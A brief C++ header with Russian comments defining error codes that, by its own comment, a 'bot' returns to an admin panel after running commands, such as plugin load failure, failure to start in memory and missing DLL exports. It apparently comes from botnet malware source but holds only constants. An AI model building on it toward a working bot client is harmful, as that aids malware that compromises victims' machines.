//ошибки которые возвращает бот админке при выполнении команд

namespace TaskErr
{

const int Succesfully = 0; //нет ошибки
const int Wrong = 1; //команда не выполнилась
const int Param = 2; //неверные параметры
const int PluginNotLoad = 3; //не загрузился плагин
const int NotCreateDir = 4; //не удалось создать папку
const int Runned = 5; //уже запущено
const int OutOfMemory = 6; //нехватка памяти
const int NotRunInMem = 7; //не удалось стартануть в памяти
const int NotExportFunc = 8; //не удалось найти экспортируемые функции в длл
const int BadCab = 9; //не удалось распаковать cab архив

}
